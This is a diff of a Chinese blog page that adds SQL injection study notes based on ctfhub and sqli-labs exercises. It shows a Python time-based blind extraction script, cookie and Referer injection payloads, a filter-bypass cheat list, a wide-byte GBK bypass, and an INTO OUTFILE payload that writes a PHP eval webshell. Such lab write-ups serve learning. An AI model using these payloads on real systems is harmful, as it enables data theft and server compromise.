@@ -446,14 +446,14 @@
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    4.7k
+                    7.8k
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    18 分
+                    30 分
                 </div>
                 
 
@@ -474,7 +474,7 @@
 <ol>
 <li>判断是否存在注入（是否严格校验）<ol>
 <li>可控参数改变是否影响页面</li>
-<li>输入的sql语句是否能引发报错—通过报错可以看到数据库的一些语句痕迹</li>
+<li>输入的sql语句是否能引发报错—通过报错可以看到数据库的一些语句痕迹**(比如使用单引号，双引号，小括号等，以及其组合，是sql语句闭合，导致原来的闭合语句后半部分报错，需要经验的积累)**</li>
 <li>能否消除报错（闭合）</li>
 </ol>
 </li>
@@ -484,7 +484,7 @@
 <li>获取想要的数据<ol>
 <li>数据库-》表-》字段-》值<ol>
 <li>当我们使用mysql时可以注意到，不止一个库，而其中的<strong>infomation_schema</strong> 库储存着<strong>所有库中的表</strong>的有关信息</li>
-<li>infomation_schema中有三个表储存着我们想要的信息<ol>
+<li>information_schema中有三个表储存着我们想要的信息<ol>
 <li>schemata表，该表中的<strong>schema_name</strong>字段包含了所有<strong>数据库的name信息</strong>，其它字段不做考虑，分别是编码和sql_path等，通过<strong>schema_name</strong>列来进行数据库的查询</li>
 <li>tables表，该表中的<strong>table_name</strong>字段包含了所有的库中所有的表的名称，且其中的table_schema列包含了所有的库的名称（有重复，因为和后面的table_name)相对应</li>
 <li>columns表，该表中的<strong>column_name</strong>字段包含了所有库中所有表的所有<strong>字段名称</strong>，其中的table_schema列包含了所有的库的名称，table_name列包含了所有的库中所有的表的名称</li>
@@ -653,6 +653,107 @@ urlOpen<span class="token operator">=</span><span class="token string">'http://c
 
 </code></pre>
 <p>最后就可以输出了flag了，前面查询库，表也和这个类似，只是sql语句换一下罢了，这里就偷懒了</p>
+<h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>也叫时间延时注入，这种注入在我们输入单引号，双引号，小括号时他都不会显示出报错（但其实是已经出错了），页面不会改变，这时候就需要通过if(),sleep()函数，使得我们的判断条件为真时会有页面延时的情况出现，即，构造好了语句，如果我们想要判断的条件为真，则页面执行会出现延迟，如果为假则不会有延迟。给出一个语句实例：<code>?id=-1 or if(select ascii(substr(table_name,1,1)) from informatio_schema.tables where tabel_schema=database() limit 0,1)=100,sleep(2),0) #</code></p>
+<p>首先看一下if()和sleep()</p>
+<ul>
+<li>if(expr1,expr2,expr3)<ul>
+<li>第一个参数是要判断真假的语句</li>
+<li>如果为真，执行第二个参数</li>
+<li>为假执行第三个参数</li>
+</ul>
+</li>
+<li>sleep():等待多少秒执行啊</li>
+</ul>
+<p>我们所做的查询即第一个if参数，是需要判断真假的，其语法和布尔盲注一样，需要以此判断字符是多少，如果为真则会sleep两秒，可以看到执行时页面会有两秒的加载时间，如果为假，则不会有两秒的加载时间，以此判断即可</p>
+<p><strong><em>这种手动做的话肯定不现实，需要借助工具或者写脚本，还是强调，这里只是原理</em></strong></p>
+<p>还是以ctfhub的时间注入作为实例，还是写脚本解决，首先先测试一下：<code> http://challenge-5cb70d9ee61e79a0.sandbox.ctfhub.com:10080/?id=-1 or if((select ascii(substr(database(),1,1))=115),sleep(2),0) #</code></p>
+<p>可以看到等于115时可以产生延时，那就按照这个语法写脚本就好了</p>
+<pre class=" language-python"><code class="language-python">name<span class="token operator">=</span><span class="token string">''</span>
+urlOpen<span class="token operator">=</span><span class="token string">'http://challenge-5cb70d9ee61e79a0.sandbox.ctfhub.com:10080/?id=-1'</span>
+<span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">for</span> j <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+        <span class="token comment" spellcheck="true"># url=urlOpen+' or if((select ascii(substr(database(),%d,1)))=%d,sleep(2),0) #'%(i,j) #库名</span>
+        <span class="token comment" spellcheck="true"># url = urlOpen +' or if((select ascii(substr(table_name,%d,1) from information_schema.tables where table_schema=\'sqli\')=%d),sleep(2),0) #'%(i,j)</span>
+        url <span class="token operator">=</span> urlOpen <span class="token operator">+</span><span class="token string">' or if((select ascii(substr(flag,%d,1)) from flag)=%d,sleep(1),0) #'</span> <span class="token operator">%</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>j<span class="token punctuation">)</span>
+        time1<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">try</span><span class="token punctuation">:</span>
+            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">100000</span><span class="token punctuation">)</span>
+        <span class="token keyword">except</span> requests<span class="token punctuation">.</span>exceptions<span class="token punctuation">.</span>ConnectionError<span class="token punctuation">:</span>
+            <span class="token keyword">pass</span>
+        time2<span class="token operator">=</span>time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>
+        <span class="token keyword">if</span> time2<span class="token operator">-</span>time1<span class="token operator">>=</span><span class="token number">1</span><span class="token punctuation">:</span>
+            name<span class="token operator">=</span>name<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span>
+            <span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span>
+            <span class="token keyword">break</span>
+<span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span></code></pre>
+<p>跑出来就好了，但发现跑的过程很艰辛，因为原理是时间延迟，所以如果网络不畅或者requests超时啥的会让人很头疼，可能出现一些错误的字符。。。跑了好多次。。。依旧失败了，每次都有flag结构但都会有些位出错，我选择sqlmap了。。。**<em>哈哈哈，最后一次脚本和sqlmap同时跑脚本先跑出来了，真的是网络原因，不稳定是真滴难受**</em></p>
+<h3 id="cookie注入"><a href="#cookie注入" class="headerlink" title="cookie注入"></a>cookie注入</h3><p>就是注入点在cookie中，cookie是啥不再介绍，我们需要在cookie处进行注入，具体注入方法按照环境来决定，需要自己慢慢的尝试，也是一个经验的问题。需要多练习，以ctfhub上的cookie注入来作为例子。使用burpsuite来进行注入</p>
+<p>打开题目告诉我们注入点变了，使用burp抓包</p>
+<p>可以看到cookie：</p>
+<pre><code>Cookie: id=1; hint=id%E8%BE%93%E5%85%A51%E8%AF%95%E8%AF%95%EF%BC%9F</code></pre>
+<p>我们在id这里进行注入，在repeter里进行 </p>
+<p><code>Cookie: id=-1 union select 1,database();</code></p>
+<p>可以看到已经显示出了database，继续注入就好了，不再演示，最后的语句是<code>Cookie: id=-1 union select 1,group_concat(nuwjexalch) from nuyuogkrho;</code></p>
+<p>得到flag</p>
+<h3 id="http-Referer注入"><a href="#http-Referer注入" class="headerlink" title="http-Referer注入"></a>http-Referer注入</h3><p>及注入点在referer中，可以注意到在讲解视屏中除了可以看到，讲解人通过其报错信息发现，<strong>并不是通过select的语句进行注入，而是update或者insert</strong>，所以需要复习一下sql语句啊。。。所以其实重要的还是找到注入点和使其报错以及<strong>通过构造语句使其不报错</strong>，下面以ctfhub上的referer注入为实例进行实验，打开页面可以看到提示我们“请在referer输入id”，使用burpsuite进行抓包，抓了后看了一下，没有referer字段，需要自己构造，注意构造的格式，最开始就是因为构造格式不对所以错了</p>
+<p>最开始是这样构造的：</p>
+<pre><code>Referer: id=1    #发现不对
+Referer: 1        #这样才对
+接下来继续注入就对了</code></pre>
+<p><code>Referer: -1 union select 1,group_concat(hnsyfohxaa) from verizqvbgj</code></p>
+<p>这是最后的referer语句</p>
+<h3 id="sql注入读写文件"><a href="#sql注入读写文件" class="headerlink" title="sql注入读写文件"></a>sql注入读写文件</h3><p>读取文件是通过一个Load_file(file_name)函数来进行的对服务器上的文件的读取,这个函数有四个使用条件</p>
+<ul>
+<li>必须有权限读取并且文件必须完全可读</li>
+<li>欲读取文件必须在服务器上</li>
+<li>必须指定完整的路径</li>
+<li>欲读取文件大小必须小于max_allowed_packet</li>
+</ul>
+<p>还是先要判断注入点和注入类型，然后再在这里进行文件的读取，比如<code>?id=1&#39; union select 1,load_file(&quot;C:\\www\\sqli&quot;)</code>,然后在?id前的路径出写上想要访问的文件如:”index,php”</p>
+<p>写入文件：</p>
+<p>函数outfile(),和load_file很类似，比如</p>
+<p><code>?id=1&#39; union select 1,2,&quot;&lt;?php @eval($_POST[aaa];?)&quot; into outfile &quot;C:\\www\\sqli\\a.txt&quot; #</code></p>
+<p>这样就将一个一句话木马写入了文件a.txt（注意，还是要有绝对路径和权限才行），这样就可上传一个一句话木马，再拿webshell、</p>
+<h3 id="绕过注释符过滤"><a href="#绕过注释符过滤" class="headerlink" title="绕过注释符过滤"></a>绕过注释符过滤</h3><p>简单的加注释消除报错失败，注释符会被过滤掉，这种时候我们需要使用别的方法来在发现注入点，报错后消除报错，这种时候需要对sql语法的熟练以及一些骚操作整除一些畸形的语句，使其闭合，在课程中讲解人使用的是?id=1’ or(select….) or’这样可以让语句闭合，也需要通过不断的实验以及分析报错的提醒来得到正确的语法</p>
+<p>这里以sqli的less-23作为演示</p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39;</code>这样可以得到报错，但我们加#或者–+都无法消除报错，且<code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39; %23 a</code>会看到页面上显示的错误是在<strong>a</strong> 附近，没有我们的注释符的影子，这种时候就该考虑注释被过滤掉了，要使用新的方法使其闭合。我们思考这时sql语句<code>select * from aaa where id=&#39;1&#39;&#39; limit 0,1</code> 要消除报错主要是要去掉单引号的影响，这时候用的是or，完整语句是这样的<code>select * from aaa where id=&#39;1&#39; or&#39;&#39; limit 0,1</code>这样可以消除报错，最后是使用两个or在or中间进行注入</p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39; or (select database()) or&#39;</code>这样不会报错，但显示不出database，使用报错注入</p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-23/?id=1&#39; or (extractvalue(1,concat(0x7e,database()))) or &#39;</code></p>
+<p>这样就可以得到database了，database换为select就可以得到想要的了，</p>
+<p>对这种微妙也可以使用union select加单引号来进行绕过，也是通过单引号使其闭合</p>
+<h3 id="绕过or-and过滤注入"><a href="#绕过or-and过滤注入" class="headerlink" title="绕过or-and过滤注入"></a>绕过or-and过滤注入</h3><p>我们也可以通过一些报错看到and和or被过滤了，可以先使用大小写试试，不行就换思路，比如使用||来代替or，使用&amp;&amp;来代替and，看哪些不被过滤，所以也就是一些绕过的姿势，以sqli-less-25为例子，<code>http://127.0.0.1:85/sqli-labs/Less-25/?id=1&#39;  %23</code>可以看到这样已经可以消除报错，但是使用orderby时发现会报错，<code> near &#39;der by #&#39;</code>在order前加个a，报错为<code> use near &#39;ader by #&#39;</code>,可以发现or被过滤掉了，这里我们直接用union select就可以解决<code>http://127.0.0.1:85/sqli-labs/Less-25/?id=-1&#39;  union select 1,2,3 %23</code>可以查询，然后再注入就好了，同时，我们也可以使用||来代替or来进行注入，<code>http://127.0.0.1:85/sqli-labs/Less-25/?id=-1&#39;  || (extractvalue(1,concat(0x7e,database()))) %23</code>这样也可以进行注入</p>
+<h3 id="绕过空格过滤"><a href="#绕过空格过滤" class="headerlink" title="绕过空格过滤"></a>绕过空格过滤</h3><p>同样的，可以通过报错可以看到我们在一些语句中空格被过滤掉了，比如我们使用select database(),会报错selectdatabse 不存在报错<code>FUNCTION security.selectextractvalue does not exist</code>，注意空格没了，这时候就考虑时空格绕过，绕过空格我们使用转义来表示空格字符，常用有以下几种，因为系统原因所以需要都进行测试，</p>
+<ul>
+<li>%09 tab键（水平）</li>
+<li>%0a 新建一行</li>
+<li>%0c 新的一页</li>
+<li>%0d return功能</li>
+<li>%0b tab键（垂直）</li>
+<li>%a0 空格</li>
+<li>/**/ 代替空格</li>
+<li>/*!*/ 代替空格</li>
+</ul>
+<p>以sqli-less-26 作为例子</p>
+<p>这是个混合题，过滤了注释和or，所以最后的写法是</p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-26/?id=1&#39; || (select/*!*/extractvalue(1,concat(0x7e,database()))) || &#39;</code></p>
+<p>虽然这里的报错注入其实用不到select但为了解释空格绕过使用了，也一样，视频里用%a0绕过的，这里不知道为什么不行，最后使用/*!*/ 才绕过了，后续就不查了，一样的。</p>
+<p>做了一下ctfhub的空格绕过，发现第二步使其闭合就卡住了，怎么都不能闭合，但是并没有影响注入。。。因为是过滤空格，所以直接替换空格就行了。。。</p>
+<p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=1/**/order/**/by/**/2</code></p>
+<p>这样就能显示了，</p>
+<p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database()</code></p>
+<p>查表</p>
+<p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=database()/**/and/**/table_name=&#39;ppaymrtivl&#39;</code></p>
+<p>查列</p>
+<p><code>http://challenge-f2c8e6cc44feafeb.sandbox.ctfhub.com:10080/?id=-1/**/union/**/select/**/1,group_concat(nalhiirshz)/**/from/**/ppaymrtivl</code></p>
+<p>得到flag，总觉得ctfhub的环境怪怪的，不能闭合还是能继续往下走<del>肯定不是我的问题</del></p>
+<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>这里视频里是用的less-27作为环境，使用内联注释绕过失败了，<del>尴尬</del>但方法得记住，内联注释就是将被过滤掉的语句使用/*!*/包裹起来，比如如果select被过滤掉了则我们使用/*!select*/来进行包裹，可能能绕过过滤，视频里这样不知道为啥失败了，老师使用了另外两种方法，一是大小写，比如写成selEct,以及拼接，在select中再放一个select<code>selselectect</code>这样中间的完整的select被过滤掉以后外层的拼接起来就好了。<del>大概就是这样，不想实验了，累了</del></p>
+<h3 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h3><p>什么叫宽字节：当MySQL使用GBK作为编码时会用两个字节作为汉字，有的时候网站会通过加上反斜杠来进行过滤，此时我们加单引号后不会报错，因为单引号前被加了反斜杠被转义了，这种时候尝试宽字节注入，因为反斜杠的编码时%5c，如果是GBK编码，我们在他前面加一个字符，使其成为一个GBK范围内的编码，（编码范围见百度），就“吃掉”了反斜杠，继续成功执行注入</p>
+<p>以less-33为例子</p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-33/?id=1&#39;</code></p>
+<p>加入单引号后没有报错，页面上显示出hint：Hint: The Query String you input is escaped as : 1\‘</p>
+<p>单引号前有一个反斜杠，我们的单引号被过滤掉了，下一行hint：The Query String you input in Hex becomes : 315c27，我们输入的id=1\‘的编码时这么多，我们知道，反斜杠的编码时%5c，如果我们在其之前加入另外的编码使其成为宽字节，就可以去掉反斜杠了，查询GBK的范围，选择一个，%df，这样df5c属于宽字节，加入%df后形成的新字节被MYSQL忽视，反斜杠也没了，这样我们的单引号就又起作用了，具体语法为<code>http://127.0.0.1:85/sqli-labs/Less-33/?id=1%df&#39;</code></p>
+<p><code>http://127.0.0.1:85/sqli-labs/Less-33/?id=-1%df&#39; union select 1,2,database() %23</code></p>
+<p>这样已经成功注入了。后续不表</p>
 
             </div>
             <hr/>
@@ -1194,7 +1295,7 @@ code[class*="language-"], pre[class*="language-"] { white-space: pre !important;
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">10.2k</span>&nbsp;字
+                class="white-color">13.2k</span>&nbsp;字
             
             
             
